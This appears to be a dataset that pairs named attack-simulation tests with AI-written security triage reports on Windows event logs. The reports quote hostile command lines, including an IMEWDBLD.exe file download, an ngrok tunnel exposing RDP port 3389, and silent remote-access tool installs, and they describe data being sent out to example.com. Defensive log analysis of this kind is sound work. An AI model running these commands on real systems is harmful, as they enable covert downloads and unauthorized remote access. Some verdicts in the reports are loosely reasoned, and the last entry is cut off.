Download a file with IMEWDBLD.exe,"### Detailed Analysis of Windows Event Logs

#### Overview
This analysis evaluates a set of Windows event logs containing System, Application, Sysmon, Windows PowerShell, and Security logs from a host named Server002. The primary objective is to identify any indicators of malicious activity or compromise.

#### Suspicious or Anomalous Behavior
1. **PowerShell Execution**: 
   - The logs reveal the execution of a PowerShell script with the following command:
     ```
     powershell.exe & {$imewdbled = $env:SystemRoot + ""\\System32\\IME\\SHARED\\IMEWDBLD.exe"", & $imewdbled https://raw.githubusercontent.com/file/file-file/master/files/data/data.yaml}
     ```
   - The behavior involves downloading a YAML file from GitHub using `IMEWDBLD.exe`. This executable is typically associated with text services and input method editor (IME) dictionaries, which are not standard download methods.

2. **Privileges and Logon Events**:
   - The logs display events where a user `admin_test` was granted several high-level privileges:
     - `SeSecurityPrivilege, SeBackupPrivilege, SeRestorePrivilege, SeTakeOwnershipPrivilege, SeDebugPrivilege, SeSystemEnvironmentPrivilege, SeLoadDriverPrivilege, SeImpersonatePrivilege, SeDelegateSessionUserImpersonatePrivilege`.
   - These privileges, particularly `SeDebugPrivilege` and `SeTakeOwnershipPrivilege`, are indicative of potential privilege escalation scenarios.

3. **Suspicious Command Line Execution**:
   - Multiple instances of `wevtutil.exe` and `conhost.exe` executed under the context of the `admin_test` user are logged. Though not inherently malicious, repeated patterns without typical parent process relationships may be concerning in certain contexts.

4. **Process Execution**:
   - There were multiple executions involving `MicrosoftEdgeUpdate.exe` related processes which might have been benign if related to software updates. However, the presence in the `Temp` directory as seen in the following:
     ```
     C:\Program Files (x86)\Microsoft\Temp\EUCDC6.tmp\MicrosoftEdgeUpdate.exe
     ```
   - Processes spawned in temporary directories frequently suggest attempts to evade detection or perform unauthorized activities.

#### Assessment of Malicious Activity
- **Malicious Indicators**:
  - The usage of PowerShell with non-standard commands to access external resources via GitHub is highly suggestive of a script-based attack or data exfiltration attempt.
  - The combination of high privilege allocations and unusual process executions under the context of `admin_test` points to potential privilege escalation or reconnaissance activities.

#### Conclusion
Based on the analysis of the logs, the activities observed are beyond benign behaviors typically expected on a standard host operation, and the highlighted indicators suggest a degree of compromise.

### Resolution
- **Resolution**: **MALICIOUS**

#### Guidance on How to Proceed
1. **Immediate Response**:
   - Isolate the affected host (Server002) from the network to prevent potential lateral movement or further compromise.
   - Analyze the downloaded YAML file referenced in the PowerShell command to assess its contents and potential malicious payload.
   
2. **Investigative Actions**:
   - Review user account activities for `admin_test` to investigate any unauthorized access or privilege misuse.
   - Examine firewall and intrusion detection logs for any anomalies surrounding the timestamps of the suspicious activities.
   - Conduct a deeper forensic analysis to ascertain any persistence mechanisms or backdoors.

3. **Remediation and Mitigation**:
   - Implement security patches and changes to OS configurations that can mitigate unauthorized privilege escalation.
   - Review and restrict PowerShell execution policies, especially for non-administrative users.
   - Monitor outgoing network traffic for unusual destinations to identify further indicators of data exfiltration.
   
Documentation and analysis of these events should be shared with the incident response team to enhance detection and prevention strategies against similar attacks in the future."
iwr or Invoke Web-Request download,"After reviewing the provided logs, here is a detailed analysis of the observed activities:

1. **System Log:** 
   - The logs show several events related to time adjustments made by the `svchost.exe` process. These are usually benign and associated with system time synchronization but, if altered maliciously, could indicate tampering.

2. **Application Log:** 
   - An event from the Software Protection Platform Service (SPP) was noted. There are no signs of unusual or suspicious activity here. The record seems regular with no indicators of compromise.

3. **Security Log:** 
   - Events related to successful time change by the `svchost.exe` process were logged. This again indicates time synchronization actions and appears consistent with normal operations unless other contextual threats are identified.

4. **Sysmon Log:** 
   - Several events were noted for processes such as `wevtutil.exe`, `conhost.exe`, `powershell.exe`, and other system processes like `MicrosoftEdgeUpdate.exe`. While individual entries like the execution of `powershell.exe` with scripts could be suspicious, the activity here involved downloading a LICENSE file from GitHub, which may not be overtly malicious without additional context (like downloading a malicious script).
   - Usage of `whoami.exe` and `hostname.exe` by `admin_test` seems to correlate with typical administrative operations to verify user status and host details.
   - The presence of frequent interactions with `powershell.exe` and atypical downloading activities (including resulting file storage paths such as `%temp%`) from the internet could indicate a potential risk vector, particularly if not authorized by policy or known scripts for maintenance. This behavior could justify further investigation due to its susceptibility for misuse in a compromise setting.

5. **Windows PowerShell Log:**
   - Multiple PowerShell providers like Registry, Alias, Environment, etc., are started, typical for a PowerShell script execution. 
   - The PowerShell command line execution observed was for downloading a file from a GitHub repository to a temp path, which, in isolation, lacks overt indicators of compromise. However, it could potentially be part of a broader unauthorized activity depending on organizational context and permission policies.

### Assessment and Recommendation:

The logs do suggest some actions that require cautious consideration—primarily the use of PowerShell for downloading an internet-hosted file. While no definitive indicators of malware or direct harm were apparent, such activities can be precursors or components of malicious behavior if unauthorized.

**Resolution: SUSPICIOUS**

### Guidance:
- **Immediate Action:**
  - Verify if the usage of PowerShell to interact and download from the internet, specifically the involved GitHub repository and file, is sanctioned within the environment based on current IT policies.
  - Conduct a follow-up with the user account ""admin_test"" to determine if these actions were intentional and authorized.
  - Check for the existence of the downloaded file and analyze its contents to confirm its nature and ensure no harmful actions follow.

- **Further Investigation:**
  - Review system policies and log additional PowerShell activities to identify atypical patterns or unauthorized scripts.
  - Reinforce endpoint monitoring to detect similar patterns.
  - Ensure time synchronization activities align with expected Windows time service operations and no unauthorized time manipulation occurs.

Following these steps should mitigate potential risks if any unauthorized behavior is ongoing while confirming the benign nature of the activities if executed with legitimate intent."
Lolbas replace.exe use to copy UNC file,"After analyzing the provided Windows event logs from various channels including Sysmon, System, and Application logs, here are my findings:

1. **Time Service Log (System Log):**
   - The only entry relates to the Windows Time Service selecting a time source. This is standard behavior for a Windows server to synchronize its time using NTP servers. There are no indicators of compromise here.

2. **Sysmon Log Analysis:**
   - **Frequent Execution of Native Windows Utilities:** There are numerous instances of `wevtutil.exe` and `conhost.exe` being executed by the user `SERVER002\admin_test`. These utilities are legitimate Windows processes often used for interacting with Windows event logs and console windows, respectively.
   - **High Integrity Level Processes:** There are entries indicating the execution of commands such as `whoami.exe`, `hostname.exe`, and `cmd.exe` by the user `SERVER002\admin_test`. While execution of these tools can be legitimate, the context (High integrity) and frequency might be unusual for a non-admin user.
   - **Command Prompt Subprocess:** The command line for `cmd.exe` includes file operations (deleting a `.cab` file and using `replace.exe`) which could potentially be administrative tasks. The command uses `TEMP` directories which might be suspicious depending on the user's normal behavior and permissions. However, without full knowledge of typical operations or deviation from standard procedures, it's inconclusive.
   - **System Update Processes:** There are a number of logs indicating `MicrosoftEdgeUpdate.exe` and related processes being executed as part of a Microsoft Edge update. The frequent entries around Microsoft Edge Update processes and related COM registration activities appear legitimate as part of an update process.

3. **Application Log Analysis:**
   - Entries from the `edgeupdate` provider stating ""Service stopped"" correspond with the timing of the Edge update logs in the Sysmon logs, again suggesting a routine update event.

**Assessment:**
- The logs exhibit a significant amount of process execution tied to `admin_test` showing high integrity processes being run. However, there is no direct evidence of malicious activity such as unauthorized privilege escalation, anomalous network connections, or attempts at persistence mechanisms.
- The Edge update activities match with legitimate update processes and appear to be functioning as expected.

**Conclusion:**
- **Resolution:** SUSPICIOUS
- **Reasoning:** While many activities appear routine, the repeated use of high-integrity command line executions, especially concerning file manipulations, warrants further investigation to confirm if they align with expected administrative behavior or scheduled tasks. This investigation should include confirming the legitimacy and necessity of such commands with system administrators and checking the activity against known baselines for the system.

**Guidance:**
- Review task schedules or scripts associated with the `admin_test` user account to validate the use of these tools.
- Check for any recent changes to the account's privileges or unusual access rights.
- If possible, conduct a behavioral analysis to establish the context of command executions to ensure compliance with internal policies.
"
DNS over HTTPS Large Query Volume,"Based on the logs provided, the analysis indicates the following behaviors and events:

### Suspicious or Anomalous Behavior:

1. **PowerShell Invocation:**
   - There is a repetitive execution of PowerShell with a script that seems to be performing an unusual operation: `Invoke-WebRequest` to a public DNS resolver (8.8.8.8) for generating random requests repeatedly (`for($i=0; $i -le 1000; $i++)`).
   - This behavior can be used as a network reconnaissance technique or a method to evade detection systems by generating a large number of DNS queries.

2. **Multiple Logon Events and Privilege Assignments:**
   - The `admin_test` user is granted several high-level privileges such as `SeDebugPrivilege`, which allows a user to debug other processes, a feature usually not necessary for a standard user.
   - The `admin_test` account logs on with a `LogonType` of 3, indicating network logon, which might be unusual depending on the typical use of this account.

3. **Edge and Other Process Executions:**
   - Multiple instances of Edge Update processes (`MicrosoftEdgeUpdate.exe`) are being executed. While this itself is not inherently malicious, the frequency could suggest automation or an unwanted application update.
   - These processes are executing with `NT AUTHORITY\SYSTEM` privileges, which indicates they have full system access.

### Judgement on Malicious Activity:

- **PowerShell Task:** The PowerShell script execution with web requests to `8.8.8.8` is notably suspicious. This type of networking event requires further investigation to determine the intent and if any data is being exfiltrated or if it's part of a scheduled maintenance script.
- **Use of Privileges:** The presence of multiple high-level privileges while logged in as `admin_test` raises a red flag as it could indicate potential unauthorized elevation or lateral movement within the system.
- **Edge Update Processes:** These might indicate possibly benign automated software updates, but with the context of other suspicious activities, they warrant verification that these updates are legitimate.

### Conclusion:

Based on the collected information:

- **Resolution: SUSPICIOUS**

Further investigation is warranted to verify the PowerShell script's purpose and the legitimacy of the admin actions and Edge updates. Ensure that the `admin_test` account is not compromised, and network monitoring should be conducted to validate or rule out the transfer of data outside the organization. Additionally, a review of scheduled tasks or automation scripts might be necessary to establish if these events are expected behavior."
Run ngrok,"### Detailed Analysis:

**1. Anomalous PowerShell Activity:**
   - Several events indicate the execution of PowerShell scripts using the `powershell.exe` process. The command line argument provided shows the following suspicious activity:
     ```plaintext
     ""powershell.exe"" & {C:\Users\Public\ngrok\ngrok.exe config add-authtoken N/A | Out-Null, Start-Job -ScriptBlock { C:\Users\Public\ngrok\ngrok.exe tcp 3389 } | Out-Null, Start-Sleep -s 5 , Stop-Job -Name Job1 | Out-Null}
     ```
   - The use of `ngrok.exe` suggests the setup of a remote connection or a tunnel, specifically targeting TCP port 3389, which is commonly used for Remote Desktop Protocol (RDP).
   - The execution of `ngrok.exe` and adding an authentication token is a behavior typically associated with establishing an unauthorized remote access capability.

**2. Repeated Execution of Common System Tools:**
   - There are multiple occurrences of system utilities such as `conhost.exe`, `wevtutil.exe`, `hostname.exe`, and `whoami.exe` being executed. While these are standard Windows utilities, their frequent invocation in a short time period could indicate a scripted process or automated activities.
   - The context in which they appear, particularly alongside suspicious PowerShell activities, can hint toward recon or persistence actions part of attack scripts. 

**3. Processes Related to Potential Software Update:**
   - It is apparent that there are Microsoft Edge Update processes (e.g., `MicrosoftEdge_X64_130.0.2849.56_129.0.2792.89.exe`, `setup.exe`) being executed with legitimate Microsoft Corporation signatures. These appear consistent with benign software updates.

**4. User Context Analysis:**
   - Most activities, including those involving `ngrok.exe` and PowerShell, are executed under the `SERVER002\admin_test` user context. This administrative user context could be exploited for privilege escalation or to circumvent security measures if not monitored properly.

**Assessment and Threats:**

- **Malicious Indicators:**
  - The invocation of `ngrok.exe` via PowerShell, with the purpose of configuring a tunnel to port 3389, strongly indicates malicious intent. This behavior is commonly used to bypass network monitoring mechanisms and establish unauthorized remote access.
  
- **Risks Identified:**
  - The potential for unauthorized external access and data exfiltration. The execution under an administrative user context increases the risk of further exploitation and privilege escalation.

**Guidance and Resolution:**

- The primary indicator of malicious activity is the usage of `ngrok.exe` within PowerShell scripts to facilitate remote connections. This behavior is not typical for legitimate administrative tasks and should be immediately investigated and mitigated.

- **Recommended Actions:**
  1. **Immediate Investigation:** Examine the machine for the presence of ngrok and related unauthorized scripts or tools. Gather information on who and how the `admin_test` account is being utilized.
  2. **Network Monitoring:** Look for any unusual outbound traffic on port 3389 or other potentially exploited ports.
  3. **User Review:** Review administrative account usage, especially `admin_test`, for unauthorised access or activity.
  4. **Mitigation Steps:** Remove `ngrok.exe` and any unauthorized scripts. Ensure all remote access vectors are secured and monitored.
  5. **Forensic Analysis:** Conduct a deeper forensic investigation to determine the full extent of compromise and ensure no other malicious artifacts exist on the system.

**Resolution:** **MALICIOUS** - The Sysmon and PowerShell logs contain indicators of a potentially compromised system actively establishing unauthorized remote access capabilities using `ngrok.exe` through PowerShell scripts. Immediate action is required to mitigate the risk."
Printer Migration Command-Line Tool UNC share folder into a zip file,"After analyzing the provided Windows event logs, the following observations and assessments can be made:

### Security Log Analysis
1. **Event ID 4616**: This event indicates a change in the system time. The time adjustment itself is fairly small (a few seconds), and the process responsible, `svchost.exe`, is a legitimate Windows process running under the `LOCAL SERVICE` account. This type of event is generally benign unless there's evidence of frequent and unexplained time changes, which could indicate attempts to manipulate timestamps for malicious purposes.

### Sysmon Log Analysis
1. **Process Execution Events (ID 5 and 1)**: The Sysmon logs reveal multiple instances of processes like `wevtutil.exe`, `conhost.exe`, `HOSTNAME.EXE`, `whoami.exe`, and `cmd.exe` being executed by the user `SERVER002\\admin_test`. 
   - `wevtutil.exe` and `conhost.exe` are often involved in managing event logs and console windows, respectively. Their repeated occurrences can be typical in script execution or when managing logs.
   - `HOSTNAME.EXE` and `whoami.exe` are used to identify the machine's hostname and the user context, often utilized in administrative scripts or troubleshooting.
   - Of particular note is the execution of `cmd.exe` with the command line involving `PrintBrm.exe` and deleting a zip file from the temporary directory, suggesting possible script activity for backup or transfer operations.

2. **Command Execution**: The command running `PrintBrm.exe` using `cmd.exe` seems to perform a backup of files to a remote path (`\\\\127.0.0.1\\c$\\file\\files\\data\\src\\`). While not inherently suspicious, this activity coupled with other indicators might point to actions often observed in either automated administrative tasks or potential data exfiltration attempts.

### System Log Analysis
1. **Kernel and Time Synchronization Events**: The system logs provide standard kernel general events and time service adjustments. There is no indication that these events are part of malicious activity.

### Application Log Analysis
1. **Software Protection Platform Service**: This entry is standard and indicates an action by the Software Protection Platform Service, which manages licensing-related tasks on Windows. This is routine and non-suspicious.

### Analysis Conclusion
The logs present behaviors that could be consistent with legitimate administrative operations, such as executing system utilities, checking user identity, and performing file operations. However, the context, particularly the use of `PrintBrm.exe` and operations on files in the TEMP directory, warrants closer scrutiny due to:
- Potential for misuse in data access/manipulation
- Commands executed with high integrity level, which can indicate elevated privileges often present in malicious scenarios.

### Resolution
**SUSPICIOUS**: The activities logged are not overtly malicious but could potentially indicate misuse if not explained by normal administrative operations. Further investigation is advised to:
- Verify the legitimacy of the scripts or actions performed by `admin_test`.
- Review any related access or changes to sensitive files or directories.
- Conduct a network traffic analysis to ensure no unauthorized data transfer took place.

Recommended next steps include coordinating with system administrators to confirm if these actions are part of routine tasks and monitoring for any similar patterns."
OSTAP Worming Activity,"Upon analyzing the provided Windows event logs, several aspects of the system's activity have been assessed. Here's a summary of each section in relation to potential suspicious or malicious activities:

### System and Security Logs

- **Time Synchronization Events**: 
  - The update and synchronization of system time using the Windows Time Service reflects time updates from an official time source (`time.windows.com`). 
  - This behavior is typical and does not indicate malicious activity.

- **Service Activity**:
  - The `edgeupdate` service stopped, which is consistent with normal service operations.
  - There is no indication of anomalies or indicators of compromise based on these specific entries.

### Application Logs

- **Edge Update Activity**:
  - The repeated service stopped messages related to `edgeupdate` are typical of software update processes.
  - No suspicious parameters or execution paths are evident.

### Sysmon Logs

- **Process Execution**: 
  - Several instances of `wevtutil.exe` and `conhost.exe` are recorded, initiated by the user `SERVER002\admin_test`. These applications are legitimate Windows components used for event log management and console windows, respectively. Their frequent execution could point to system maintenance tasks or administrative activities.
  - A sequence of processes (`hostname.exe`, `whoami.exe`, `cmd.exe`) was executed with high integrity, originating from `wsmprovhost.exe`, which implies standard remote management for user/account verification or system information retrieval.

- **JScript Execution**:
  - An instance of `cmd.exe` executing a JScript via `CScript.exe` is noteworthy because the script comments about simulating worm-like behavior (""simulating how OSTap worms across network shares and drives""). This command line action is significantly suspicious and potentially indicative of malicious or test activity that mimics malware behavior. 

- **Edge Update Processes**:
  - Edge Update-related processes (`MicrosoftEdgeUpdate.exe` and `MicrosoftEdgeUpdateComRegisterShell64.exe`) executing with system integrity are standard and indicative of software update checks and changes. The absence of irregular parameters or behaviors aligns these executions with benign update activities.

### Assessment and Guidance

Given the details discovered in the system, application, security, and sysmon logs, the environment displays a primarily routine activity pattern. However, the command execution using JScript is suspicious due to its content, which suggests potential worm-like behavior. This warrants further investigation to ensure it is not part of unauthorized testing or actual malware deployment.

Based on the findings:

- **Resolution**: **SUSPICIOUS**

### Next Steps:

1. **Investigate the Source**: Determine the origin or necessity of the executed script and confirm whether this was a sanctioned test or indicates unauthorized activity.
2. **Review User Actions**: Validate the actions performed by the user `SERVER002\admin_test`, scrutinizing any administrative or maintenance tasks that might explain the logs further.
3. **Monitor for Anomalies**: Increase monitoring around similar activities to catch any repeat behavior or signs of spreading malicious actions.
4. **Security Policy Verification**: Confirm that all such scripts and activities align with internal security policy standards and adjust policies as needed."
DNS Long Domain Query,"After analyzing the provided Windows event logs, here is a detailed assessment:

### Suspicious or Anomalous Behavior Identified:

1. **PowerShell Execution:**
   - There are multiple instances of PowerShell execution (`powershell.exe`) observed in the Sysmon and Windows PowerShell logs.
   - The PowerShell command includes script execution from a temporary directory which typically isn't standard behavior for regular PowerShell operations. The command executed is:
     ```
     powershell.exe & {Set-Location \""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\"", .\\data.004\\src\\data-dns-domain-length.ps1 -Domain 127.0.0.1.nip.io -Subdomain filefilefilefilefileredte -QueryType TXT}
     ```
   - The use of `Temp` directories and possibly obfuscated paths (`ADMIN_~1`) could indicate attempts to evade detection or obfuscate actions.

2. **Process Execution:**
   - There are several instances of process executions like `wevtutil.exe`, `hostname.exe`, `whoami.exe`, and notably `MicrosoftEdgeUpdate`, but these actions by themselves can be benign unless seen in a specific context of malicious activity.
   
3. **Elevated Privileges Granted:**
   - Security log event ID 4672 indicates the `admin_test` user was granted a series of privileged rights, which include potentially dangerous privileges such as `SeDebugPrivilege`, `SeBackupPrivilege`, and `SeRestorePrivilege`. This event can indicate privilege escalation attempts if not expected or sanctioned.

4. **Edge Update Activity:**
   - Numerous processes related to Microsoft Edge Update are observed executing from the EdgeUpdate directory. This can be normal system behavior for legitimate updates, but heavy chaining of processes could also indicate misuse or a living-off-the-land attack strategy.
   - There are Edge update processes spawning from temporary directories, which might be indicative of abnormal behavior if not corroborated with actual legit updates from trusted sources.

### Indicators of Malicious Activity or Compromise:

- The PowerShell activity is particularly concerning due to the potential use of scripts from sensitive locations (Temp directory) and unusual domain queries (`127.0.0.1.nip.io`).
- Elevated privileges granted to the `admin_test` user without clear context or reason may hint at misuse or privilege escalation attempts.
- The sequence of Edge Update processes and their execution from temp directories might indicate an attempt to use legitimate software for unauthorized actions.

### Assessment and Resolution:

- **Resolution: SUSPICIOUS**

While there is no definitive evidence of malicious activity without further context, the behavior observed for PowerShell execution and the granting of elevated privileges is enough to consider the situation suspicious. It is crucial to verify the legitimacy of the PowerShell script, scrutinize the necessity and timing of the elevated privileges, and correlate with additional system/network logs or user activity records for in-depth analysis.

### Guidance on How to Proceed:

1. **Review PowerShell Scripts:**
   - Investigate the purpose and source of the PowerShell script being executed. Analyze the script contents for malicious commands or intentions.
   
2. **Audit User Privileges:**
   - Confirm why the `admin_test` user was assigned high-level privileges and ensure this aligns with organizational policies and recent user activities.

3. **Trace Edge Update Activities:**
   - Verify if the update processes correlate with approved Edge browser updates; inspect for any signs of tampering or appropriation in using update services.

4. **Extended Monitoring:**
   - Deploy enhanced monitoring on the machine for further anomalies, focusing on elevated privilege usage and PowerShell commands.

5. **Network and Endpoint Scanning:**
   - Conduct network and endpoint scans using security tools to identify any further signs of compromise or ensuing threats from potential malicious activity.

6. **User Awareness:** 
   - Ensure that the user `admin_test` is aware of these events and confirm if they initiated any such activity deliberately or if credentials may have been compromised. 

Further investigation might reveal whether this is leading to or part of a broader attack vector. It's prudent to act cautiously and assess all avenues of these events' legitimacy."
XOR Encoded data,"After analyzing the provided Windows event logs, several details emerge that highlight potential malicious activity:

1. **Time Manipulation**: There are multiple instances of EventID 4616 from the Security log and EventID 1 from the System log indicating changes to the system time. These show the system time being set backwards. Time manipulation can often be a sign of malicious activity, intended to confuse log timelines.

2. **Suspicious PowerShell Activity**: The Windows PowerShell logs contain a suspicious script execution. The command involves encoding data in a hexadecimal format and sending it to an external website (example.com) using `Invoke-WebRequest`. This is a typical behavior seen in data exfiltration attempts or command and control communication.

3. **Use of HOSTNAME and WHOAMI**: In the Sysmon logs, there are multiple executions of `hostname.exe` and `whoami.exe`. While these can be legitimate commands, when combined with other indicators, they may be part of a reconnaissance phase of an attack to gather system and user information.

4. **Wevtutil Executions**: Wevtutil is used to query, backup, and clear the event logs. There's a series of `wevtutil.exe` executions in the logs. While legitimate in certain administrative actions, frequent or unexplained use can be suspicious, particularly if an attacker is trying to hide their tracks by clearing logs.

5. **High Integrity Level**: The logs show processes running with a high integrity level. This, combined with the other suspicious activities, suggests potential elevated privileges.

**Assessment**: The combination of system time manipulation, suspicious PowerShell activity, and potential log-clearing attempts via `wevtutil`, along with reconnaissance commands, strongly suggests malicious activity.

**Resolution**: MALICIOUS

**Guidance on How to Proceed**:
- Isolate the affected machine to prevent further potential data exfiltration or lateral movement.
- Conduct a thorough forensic analysis to determine the extent of the compromise.
- Review other systems for indicators of similar activity.
- Consider resetting passwords and reviewing group policies.
- Inform relevant stakeholders and prepare communication for any potential data breach notifications if necessary."
TeamViewer Files Detected Test on Windows,"### Analysis of the Logs:

#### Suspicious PowerShell Activity:
- **PowerShell Execution**:
  - The logs show a PowerShell script downloading `TeamViewer_Setup.exe` from the internet using `Invoke-WebRequest` and then executing the downloaded executable with the `/S` (silent) option. Silent installations via PowerShell are often used in automated administrative tasks but can also be used by attackers for stealthy installation of software.
  - **Script Context**:
    - The script further automates the setup process and tries to open the TeamViewer application post-installation.
    - This indicates scripted automation which might be administrative but given no prior context from the logs about a legitimate task, it might be a potential concern.

#### Process Creation and Modifications:
- **Sysmon Logs**:
  - Many process activities including software installations and operations related to Microsoft edge updates, look typical.
  - However, there are multiple entries indicating `TeamViewer` installation processes with actions involving driver installation and manipulation (install/uninstall of `TVVirtualMonitorDriver.inf`), which could imply privilege escalation attempts or system manipulation post-installation.
  - Schtasks.exe being used to create and delete tasks related to TeamViewer might be an automated attempt to maintain persistence or perform additional configurations.

#### Security and System Logs:
- Logs show no explicit failure or malicious login activity.
- Privileges held by the user `admin_test` are quite elevated, which includes `SeDebugPrivilege`, `SeBackupPrivilege`, etc., suggesting high-level privileges.
- However, event `7045` indicates that `TeamViewer_Service.exe` was installed as a service with `auto start` which could be legitimate or an indication of persistence attempt if not authorized.

### Assessment:
- While `TeamViewer` itself is legitimate software, the manner of its deployment seen here (scripted, automated, and silent) could indicate either planned administrative tasks or unauthorized, potentially malicious activity.
- Without explicit authorization context, silent downloads and installations of remote access tools like TeamViewer are concerning, particularly if the involved account has high privileges.

### Resolution: SUSPICIOUS
- _The activity requires further investigation to validate legitimacy and authorization. 
- It involves potentially risky actions like silent installation of a remote access tool, which if unauthorized, could pose severe security risks._

### Guidance for Further Action:
1. **Verification**: Verify with the administrator or task owner whether the script and installation were authorized and necessary for business operations.
2. **Review Permissions**: Reassess permissions and access levels for the involved users to ensure least privilege principles.
3. **Check Network Traffic**: Analyze network traffic to see if any unauthorized remote access sessions occurred via TeamViewer.
4. **Endpoint Protection**: Verify that appropriate endpoint protection policies are enforced preventing unauthorized software installations.
5. **Conduct a Security Audit**: Review other similar behaviors on the network that might indicate broader exploit attempts using legitimate software tools as vectors."
Tor Proxy Usage - Windows,"After thoroughly analyzing the provided logs from various system components, here's a detailed assessment:

1. **System Logs**:
   - The system logs primarily capture Windows Update activities. These activities are common system processes that regularly occur on Windows machines, ensuring that the software environment remains secure and up-to-date. They do not indicate any malicious activity on their own.

2. **Application Logs**:
   - The main entries here involve Windows Defender being turned on. This is a positive indicator showing that baseline system security features are operational, which is typically desired for maintaining a secure system environment.

3. **PowerShell Logs**:
   - There are PowerShell command executions involving the Tor executable located in a user's local temporary directory. The use of `invoke-expression` to execute a command string, especially one involving Tor, is particularly concerning. Moreover, encoded commands appear to be executed multiple times, suggesting an attempt to disguise the true nature of the operations or to evade detection mechanisms. These activities require further investigation to understand their intent and origin.

4. **Security Logs**:
   - These logs capture various authentications and privileged accesses. The log entries are typical for system processes and service accounts, reflecting routine operations. However, there is no direct indication of privilege escalation or unauthorized access attempts.
   - The logs show processes accessing user credentials, failing often, which could indicate a system misconfiguration or an attempt to access unauthorized content. The sequences involve Microsoft Account and Windows Live data.

5. **Sysmon Logs**:
   - There are entries indicating the execution of system utilities and service processes. However, the execution of Tor again stands out here, executed within the user context with elevated privileges seemingly tied to Windows PowerShell execution. Sysmon logs show a command initiating Tor using a less common method potentially indicating misuse or exploitation.
   - The presence of command executions implicating various telemetry and diagnostic tools (e.g., `CompatTelRunner.exe`) shows routine tasks and maintenance activities performed by Windows. However, these are benign unless coupled with suspicious command-line arguments or occurring outside expected patterns.

**Conclusion**:
Upon integrating the findings, the use of PowerShell to run Tor combined with the encoded commands and temporary directory can be considered suspicious. While there are routine and expected entries in the logs reflective of benign activities, there are particular activities around the execution of Tor that necessitate further investigation.

**Resolution**: **SUSPICIOUS**

**Guidance on How to Proceed**:
- Conduct a thorough investigation of all instances of Tor execution. Determine the necessity and legitimacy of its use in the environment.
- Review the origin of the PowerShell scripts and encoded commands to clarify their intent.
- Audit user accounts and confirm no unauthorized access or privilege escalations are occurring.
- If Tor usage is unwarranted, consider containment measures and further examination of files/traces left by the process.
- Continue monitoring for any similar activities and update security policies to restrict such unauthorized or unnecessary actions in the future."
File Download with Sqlcmd.exe,"### Detailed Analysis of Logs:

1. **Security Log Analysis:**
   - **Event ID 4799:** Specifies an event related to a user being added to a group. The Caller Process Name is `setup.exe` from `Microsoft EdgeUpdate` directory. This is not inherently malicious as it could be part of a normal update process, however, this path of execution is uncommon and should be monitored for similar activities.

2. **PowerShell Log Analysis:**
   - Events indicate the execution of PowerShell with `sqlcmd` command downloading from an external GitHub URL (`https://github.com/file/file-file/raw/master/files/data/src/data.zip`) to `C:\\data.zip`. Running PowerShell scripts to download files from external sources is potentially malicious unless confirmed to be part of an authorized IT automation or update process. This action warrants further verification of the source and integrity of the downloaded data.

3. **Sysmon Log Analysis:**
   - Series of events show multiple instances of `powershell.exe` being executed and a few instances of `conhost.exe`, `wevtutil.exe` (used for Windows event logs management, usually benign but could be leveraged during attack preparations for covering tracks). Also noted are the EdgeUpdate `setup.exe` processes, which correspond to the installation/updates of Microsoft Edge. 
   - The presence of `whoami.exe` suggests attempts to check current user privilege levels which might indicate someone trying to understand or escalate privileges.
   - `powershell.exe` execution with an external call is suspicious and needs a close inspection and validation.

### Assessment of the Situation:

- **Suspicious Behavior:**
  - Execution of a PowerShell script fetching data from an external URL indicates a potential threat and requires verification. This could be a sign of data exfiltration or downloading malicious content.
  - Multiple uses of `wevtutil.exe` might suggest a cover-up attempt, though no direct evidence of log tampering was displayed.

- **Potential Malicious Activity:**
  - PowerShell execution involving external sites for downloading files constitutes a red flag for possible malware execution or unauthorized scripts trying to run on the server.

### Resolution: SUSPICIOUS

- The logs indicate activity that seems unusual and potentially harmful, specifically the downloading and execution of scripts via PowerShell connected to the external internet source.
- Further investigation is essential to verify the nature and legitimacy of PowerShell downloads and ensure the operating system's integrity is intact. It's important to confirm if these activities were done by a legitimate user with authorized intentions or signify a malicious actor's presence.
- Recommendations include isolating the affected machine for further forensic analysis, reviewing user permissions, and applying stricter policies or monitoring for scripting activities and external internet communications."
AnyDesk Files Detected Test on Windows,"After analyzing the provided Windows event logs, here is a detailed assessment:

### Analysis Summary:

1. **PowerShell Activity**:
   - There is a series of PowerShell events indicating downloading and executing an executable file (AnyDesk.exe) via PowerShell. The command `Invoke-WebRequest -OutFile C:\\Users\\$env:username\\Desktop\\AnyDesk.exe https://download.anydesk.com/AnyDesk.exe` followed by `Start-Process $file1 /S;` suggests an attempt to silently install AnyDesk, a remote desktop application, on the system. This kind of activity is often indicative of unauthorized software installation, particularly with remote access tools, and should be considered suspicious if not explicitly sanctioned.

2. **Sysmon Logs**:
   - Multiple instances indicate the executions of `AnyDesk.exe` soon after being downloaded. These logs show processes initiated from the file path where AnyDesk was downloaded, with command lines suggesting silent installation (`/S`) and execution for local service and control. The execution and installation of AnyDesk without explicit indication of user-driven activity point to suspicious behavior.

3. **Interim Service and Task Processes**:
   - Logs also record expected system activities such as updates and service operations (e.g., Edge updates and task host process executions). These entries seem routine for system maintenance, updating, and scheduling, with less indication of being directly related to the suspicious activity identified.

4. **Event Log Manipulation**:
   - Invocation of utilities such as `wevtutil.exe` from the `admin_test` account raises a flag for manual log manipulation or query activity which, if not part of regular administrative maintenance, could suggest a cover-up.

### Potential Threats or Risks:
- The unauthorized download and execution of remote access software (AnyDesk) represent a significant security threat. If this action is unauthorized, it could indicate an attempt by an external attacker to gain persistent access to the system.

### Guidance & Resolution:
Given the unauthorized nature of the software installation, this scenario fits the definition of activity potentially being malicious. Immediate actions should include:

- **Resolution: MALICIOUS**: The logs contain activity indicative of unauthorized remote access tool download and execution, which is considered a malicious act.
  
### Recommendations:
- **Immediate Actions**:
  - Quarantine the affected machine to prevent any external connections.
  - Review user accounts and privileges to ensure compliance with least privilege principles.
  - Conduct a full security audit on the machine and network to identify any further signs of compromise.
  
- **Long-term Measures**:
  - Institute stricter monitoring and logging policies, particularly around PowerShell execution.
  - Implement application whitelisting to prevent unauthorized software installations.
  - Conduct regular security awareness training for users to mitigate risks of phishing and similar attacks aiming to introduce unauthorized software."
GoToAssist Files Detected Test on Windows,"After a detailed analysis of the provided log entries from a Windows machine, the following assessments can be made:

### Suspicious or Anomalous Behavior

1. **PowerShell Activity**: There is evidence of PowerShell activity making an outbound connection to download an executable file named `GoToAssist.exe` from a URL (https://launch.getgo.com/launcher2/helper) using `Invoke-WebRequest`. The nature of the URL suggests it could be a legitimate remote support tool from LogMeIn; however, the security context under which this is executed and whether it was authorized remains unclear.

